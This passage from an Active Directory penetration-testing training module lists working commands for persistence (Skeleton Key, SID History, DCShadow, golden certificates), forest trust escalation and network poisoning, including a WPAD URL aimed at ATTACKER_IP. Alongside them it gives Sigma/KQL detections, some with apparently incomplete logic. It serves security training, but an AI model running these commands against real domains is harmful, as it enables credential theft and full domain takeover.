- Golden: 4769 without prior 4768; TGT lifetime anomalies; PAC group mismatch
- Silver: TGS used without any KDC interaction (no 4769 event)
- Diamond: PAC content vs actual AD group membership discrepancies
- Sapphire: ENC-TKT-IN-SKEY in 4769; sname == cname pattern
- Event ID 4624 from forged ticket source with unusual groups
- Sigma: `win_golden_ticket`, `win_silver_ticket_usage`

---

## 8. AD Persistence

### 8.1 AdminSDHolder

**Theory**: SDProp runs every 60 minutes from PDC emulator, propagates AdminSdHolder DACL to all protected objects. Adding an ACE to AdminSdHolder grants persistent control over Domain Admins, Enterprise Admins, etc.

```bash
# Impacket
dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker_user' \
  -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'DOMAIN/user:pass'

# PowerView
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' \
  -PrincipalIdentity attacker -Rights All
```

**Detection**: Event ID 5136 modifying AdminSdHolder object. Monitor DACL of `CN=AdminSDHolder,CN=System`.

### 8.2 DCSync Persistence (Grant Replication Rights)

```bash
# Grant DCSync to a controlled account
dacledit.py -action 'write' -rights 'DCSync' -principal 'backdoor_user' \
  -target 'DC=DOMAIN,DC=LOCAL' 'DOMAIN/admin:pass'

# PowerView
Add-DomainObjectAcl -TargetDistinguishedName "dc=domain,dc=local" \
  -PrincipalSamAccountName backdoor_user -Rights DCSync
```

### 8.3 SID History Injection

**Theory**: Adding privileged SID (e.g., Domain Admins S-1-5-21-...-512) to a user's SID History grants those privileges transparently.

```powershell
# Pre-Windows 2016 (Mimikatz)
mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:backdoor /new:S-1-5-21-...-512"

# Post-Windows 2016 (DSInternals, requires NTDS service stop)
Stop-service NTDS -force
Add-ADDBSidHistory -samaccountname backdoor -sidhistory $DA_SID -DBPath C:\Windows\ntds\ntds.dit -Force
Start-service NTDS
```

**Detection**: Event ID 4765 (SID History added), Event ID 4766 (attempt failed). Monitor `sIDHistory` attribute changes.

### 8.4 Skeleton Key

**Theory**: Patch LSASS on DC to accept a master password ("mimikatz") for any account, while legitimate passwords continue working.

```powershell
# Mimikatz (must run on DC with DA privs)
privilege::debug
misc::skeleton
# Now "mimikatz" works as password for any account
```

**Detection**: LSASS memory modification, Event ID 7045 (new service), monitor for Mimikatz signatures in memory.

### 8.5 DSRM Persistence

**Theory**: DSRM Administrator account on each DC has a separate local password. Set registry to allow network logon, then PtH with DSRM hash.

```powershell
# Dump DSRM hash
mimikatz.exe "token::elevate" "lsadump::sam"

# Enable remote DSRM logon
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" \
  -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# PtH with DSRM hash
mimikatz.exe "sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe"
```

**Detection**: Monitor registry key `DsrmAdminLogonBehavior` for value changes. Event ID 4794.

### 8.6 DCShadow

**Theory**: Register a rogue DC, push arbitrary AD changes via replication, then unregister. Changes appear as legitimate replication.

```powershell
# Mimikatz — register rogue DC and push changes
lsadump::dcshadow /object:targetuser /attribute:description /value:"backdoor"
lsadump::dcshadow /push
```

**Detection**: Event ID 4742 (computer account modified with SPN changes), replication from unexpected source. Monitor `nTDSDSA` object creation.

### 8.7 Certificate-Based Persistence

```bash
# Request certificate as current user (valid for years)
certipy req -u 'DA@domain.local' -p 'pass' -ca 'CA-NAME' -template 'User' -dc-ip $DC

# Golden Certificate (steal CA private key)
certipy ca -backup -u 'DA@domain.local' -p 'pass' -ca 'CA-NAME'
# Forge certificates for any user
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject 'CN=Administrator'
```

**Detection**: Monitor CA backup operations, unusual certificate enrollments for admin accounts.

### 8.8 Golden gMSA

Exploit knowledge of KDS root key to compute any gMSA password.

```bash
# Dump KDS root key (requires DA)
# Then compute gMSA passwords offline for any future rotation
```

---

## 9. Forest Trust Attacks

### 9.1 Child-to-Parent Domain Escalation (ExtraSids)

**Theory**: Compromise child domain krbtgt, forge Golden Ticket with Enterprise Admins SID of root domain in ExtraSids field.

```bash
# Impacket
ticketer.py -nthash $CHILD_KRBTGT -domain-sid $CHILD_SID -domain $CHILD_DOMAIN \
  -extra-sid "$ROOT_SID-519" "Administrator"

# Mimikatz
kerberos::golden /user:Administrator /domain:$CHILD_DOMAIN /sid:$CHILD_SID \
  /krbtgt:$CHILD_KRBTGT /sids:$ROOT_SID-519 /ptt
```

**SID Filtering**: This attack works within a forest (intra-forest trusts don't filter SIDs). External/forest trusts DO apply SID filtering, blocking ExtraSids with RID < 1000.

### 9.2 Trust Key Attacks

```bash
# Extract trust key
secretsdump.py -just-dc-user 'CHILD$' $DOMAIN/$ADMIN:$PASS@$DC

# Forge inter-realm TGT
ticketer.py -nthash $TRUST_KEY -domain-sid $CHILD_SID -domain $CHILD_DOMAIN \
  -extra-sid "$ROOT_SID-519" -spn "krbtgt/$ROOT_DOMAIN" "Administrator"
```

### 9.3 Cross-Forest Kerberoasting

With a bidirectional trust, request TGS for SPNs in the foreign forest. Same cracking applies.

---

## 10. Man-in-the-Middle in AD

### 10.1 LLMNR/NBT-NS/mDNS Poisoning

```bash
# Responder — capture hashes
responder -I eth0 -dwP

# Responder — relay mode (no poisoned responses stored)
responder -I eth0 -dwP --disable-ess
```

### 10.2 DHCPv6 Poisoning

```bash
# mitm6 — assign IPv6 via DHCPv6, point DNS to attacker
mitm6 -d domain.local

# Combine with ntlmrelayx
mitm6 -d domain.local &
ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -wh wpad.domain.local
```

### 10.3 WPAD Abuse

```bash
# Responder with WPAD
responder -I eth0 -dwP -w

# Custom WPAD via DHCPv6
mitm6 -d domain.local --wpad-auth-url http://ATTACKER_IP/wpad.dat
```

**Detection**:
- LLMNR: DNS queries over UDP 5355 to multicast
- NBT-NS: queries over UDP 137
- DHCPv6: unexpected DHCPv6 ADVERTISE/REPLY
- Sigma: `win_llmnr_nbtns_poisoning`, `net_dhcpv6_rogue_server`

---

## 11. BloodHound Queries & Attack Paths

### 11.1 Collection

```bash
# SharpHound (Windows)
SharpHound.exe -c All --outputdirectory C:\temp
SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp

# BloodHound.py (UNIX-like)
bloodhound-python -c All -u $USER -p $PASS -d $DOMAIN -dc $DC --zip
bloodhound-python -c All -u $USER -p $PASS -d $DOMAIN -ns $DC --zip
```

### 11.2 Key Cypher Queries

```cypher
// Shortest path to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// All Kerberoastable users
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames

// AS-REP Roastable users
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name

// Unconstrained delegation computers
MATCH (c:Computer) WHERE c.unconstraineddelegation=true AND NOT c.name CONTAINS 'DC'
RETURN c.name

// RBCD attack paths
MATCH p=(u)-[:GenericAll|GenericWrite|WriteProperty|WriteDacl]->(c:Computer)
RETURN p

// Users with DCSync rights
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN n.name

// Path from owned to DA
MATCH p=shortestPath((u {owned:true})-[r*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE NONE(rel in r WHERE type(rel) = "MemberOf")
RETURN p

// ACL abuse paths
MATCH p=(u:User)-[:GenericAll|WriteDacl|WriteOwner|ForceChangePassword|AddMember]->(t)
RETURN p

// Computers with LAPS
MATCH (c:Computer) WHERE c.haslaps=true RETURN c.name

// GPO abuse paths
MATCH p=(u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO)
RETURN p

// Shadow Credentials targets
MATCH p=(u)-[:AddKeyCredentialLink]->(t) RETURN p

// ADCS vulnerable templates (BloodHound CE with ADCS data)
MATCH (t:CertTemplate) WHERE t.enrolleesuppliessubject=true AND t.authenticationenabled=true
RETURN t.name

// Foreign group membership
MATCH p=(u:User)-[:MemberOf]->(g:Group) WHERE u.domain <> g.domain RETURN p

// High-value targets not in Protected Users
MATCH (u:User)-[:MemberOf*1..]->(g:Group {highvalue:true})
WHERE NOT (u)-[:MemberOf]->(:Group {name:"PROTECTED USERS@DOMAIN.LOCAL"})
RETURN u.name
```

---

## 12. Detection Signatures

### 12.1 Sigma Rules (Key Detections)

```yaml
# AS-REP Roasting Detection
title: AS-REP Roasting Activity
id: a1b2c3d4-1234-5678-9abc-def012345678
status: experimental
description: Detects Kerberos AS-REQ for accounts with preauth disabled
logsource:
  category: authentication
  product: windows
detection:
  selection:
    EventID: 4768
    PreAuthType: 0
    Status: '0x0'
  filter:
    TargetUserName|endswith: '$'
  condition: selection and not filter
falsepositives:
  - Legacy applications requiring preauth disabled
level: medium
tags:
  - attack.t1558.004
  - attack.credential_access
```

```yaml
# Kerberoasting Detection
title: Kerberoasting - Suspicious TGS Request
id: b2c3d4e5-2345-6789-abcd-ef0123456789
status: experimental
description: Detects anomalous TGS requests targeting user-account SPNs with RC4
logsource:
  category: authentication
  product: windows
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
falsepositives:
  - Legacy services requiring RC4
level: medium
tags:
  - attack.t1558.003
  - attack.credential_access
```

```yaml
# DCSync Detection
title: DCSync Attack - Directory Replication
id: c3d4e5f6-3456-789a-bcde-f01234567890
status: experimental
description: Detects non-DC machine performing directory replication
logsource:
  category: directory_service
  product: windows
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter:
    SubjectUserName|endswith: '$'
    SubjectUserName|re: 'DC\d+\$'
  condition: selection and not filter
falsepositives:
  - Azure AD Connect servers
  - SCCM site servers with replication
level: high
tags:
  - attack.t1003.006
  - attack.credential_access
```

```yaml
# RBCD Modification Detection
title: RBCD Delegation Attribute Modified
id: d4e5f6a7-4567-89ab-cdef-012345678901
status: experimental
description: Detects modification of msDS-AllowedToActOnBehalfOfOtherIdentity
logsource:
  category: directory_service
  product: windows
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
  condition: selection
falsepositives:
  - Legitimate delegation configuration by admins
level: high
tags:
  - attack.t1134
  - attack.privilege_escalation
```

```yaml
# ADCS ESC1/ESC6 - Certificate with SAN
title: Certificate Requested with Subject Alternative Name
id: e5f6a7b8-5678-9abc-def0-123456789012
status: experimental
description: Detects certificate enrollment where SAN differs from requestor
logsource:
  category: application
  product: windows
  service: certsvc
detection:
  selection:
    EventID: 4886
  filter_normal:
    SubjectAlternativeName|contains: ''
  condition: selection
falsepositives:
  - Web server certificates with SAN
  - Load balancer certificates
level: medium
tags:
  - attack.t1649
  - attack.privilege_escalation
```

```yaml
# Golden Ticket Detection - TGS Without AS-REQ
title: Potential Golden Ticket - TGS Without Prior TGT Request
id: f6a7b8c9-6789-abcd-ef01-234567890123
status: experimental
description: TGS request (4769) without a corresponding TGT request (4768) from same source
logsource:
  category: authentication
  product: windows
detection:
  selection:
    EventID: 4769
  condition: selection
  # Requires correlation: 4769 where no 4768 exists for same client IP within timeframe
falsepositives:
  - Ticket renewal from cached TGT
  - Cross-domain authentication
level: high
tags:
  - attack.t1558.001
  - attack.credential_access
```

### 12.2 Event ID Quick Reference

| Event ID | Description | Attack Indicator |
|----------|-------------|-----------------|
| 4624 | Account Logon | PtH (Type 3, NTLM), Golden Ticket (unusual source) |
| 4625 | Failed Logon | Password spraying |
| 4648 | Explicit Credentials | Lateral movement |
| 4662 | Object Operation | DCSync (replication GUIDs) |
| 4672 | Special Logon | Admin logon from unusual source |
| 4768 | TGT Requested | AS-REP Roasting (PreAuth=0) |
| 4769 | TGS Requested | Kerberoasting (RC4 for user SPNs), Golden/Silver ticket |
| 4771 | Pre-auth Failed | Password spraying |
| 4794 | DSRM Password Set | DSRM persistence |
| 4886 | Cert Requested | ADCS abuse |
| 4887 | Cert Approved | ADCS abuse |
| 5136 | Directory Object Modified | DACL/RBCD/AdminSDHolder changes |
| 5137 | Directory Object Created | DCShadow (nTDSDSA creation) |
| 7045 | Service Installed | Skeleton Key, lateral movement |
| 8222 | Shadow Copy Created | NTDS extraction |

### 12.3 KQL Queries (Sentinel / Defender)

```kql
// Kerberoasting detection
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| summarize count() by IpAddress, bin(TimeGenerated, 5m)
| where count_ > 5

// DCSync detection
SecurityEvent
| where EventID == 4662
| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !endswith "$" or SubjectUserName !matches regex @"DC\d+\$"

// RBCD modification
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity"

// Password spraying
SecurityEvent
| where EventID in (4625, 4771)
| summarize FailCount=count(), TargetAccounts=dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 10m)
| where FailCount > 10 and TargetAccounts > 5
```

---

## Tool Reference Summary

| Tool | Purpose | Key Commands |
|------|---------|-------------|
| **Impacket** | Python AD toolkit | GetNPUsers, GetUserSPNs, getST, getTGT, ticketer, secretsdump, ntlmrelayx, rbcd, dacledit, addcomputer |
| **Rubeus** | C# Kerberos toolkit | asreproast, kerberoast, s4u, golden, diamond, ptt, tgtdeleg, monitor, hash |
| **Certipy** | Python ADCS toolkit | find, req, auth, shadow, template, forge, account, ca |
| **Certify** | C# ADCS toolkit | find, request, cas |
| **Mimikatz** | C credential toolkit | sekurlsa::logonpasswords, lsadump::dcsync, lsadump::sam, kerberos::golden, sid::add, misc::skeleton |
| **BloodHound** | AD attack path mapper | SharpHound/bloodhound-python for collection, Cypher queries for analysis |
| **NetExec** | Python multi-protocol | smb/ldap with --sam, --lsa, --ntds, --kerberoasting, --asreproast, -M lsassy |
| **Responder** | LLMNR/NBT-NS/WPAD | -I eth0 -dwP for poisoning, -A for analysis |
| **mitm6** | DHCPv6/DNS poisoning | -d domain.local combined with ntlmrelayx |
| **bloodyAD** | Python AD manipulation | add genericAll, add dcsync, set password, add groupMember |
| **PowerView** | PowerShell AD recon | Get-DomainUser, Get-DomainComputer, Get-ObjectAcl, Add-DomainObjectAcl, Set-DomainObject |
| **krbrelayx** | Unconstrained delegation | krbrelayx.py listener + addspn.py + dnstool.py |
| **pypykatz** | Python Mimikatz | lsa minidump, kerberos spnroast |
| **lsassy** | Remote LSASS dump | -u USER -H HASH TARGETS |

---

## MITRE ATT&CK Mapping

| Technique | ATT&CK ID | Category |
|-----------|-----------|----------|
| AS-REP Roasting | T1558.004 | Credential Access |
| Kerberoasting | T1558.003 | Credential Access |
| Golden Ticket | T1558.001 | Credential Access |
| Silver Ticket | T1558.002 | Credential Access |
| DCSync | T1003.006 | Credential Access |
| LSASS Dump | T1003.001 | Credential Access |
| NTDS.dit | T1003.003 | Credential Access |
| SAM Dump | T1003.002 | Credential Access |
| LSA Secrets | T1003.004, T1003.005 | Credential Access |
| Pass-the-Hash | T1550.002 | Lateral Movement |
| Pass-the-Ticket | T1550.003 | Lateral Movement |
| NTLM Relay | T1557.001 | Credential Access |
| LLMNR Poisoning | T1557.001 | Credential Access |
| Certificate Theft | T1649 | Credential Access |
| RBCD Abuse | T1134 | Privilege Escalation |
| SID History | T1134.005 | Privilege Escalation |
| Skeleton Key | T1556.001 | Persistence |
| DCShadow | T1207 | Defense Evasion |
| AdminSDHolder | T1098 | Persistence |

---

*End of training module. All commands assume authorized engagement context.*
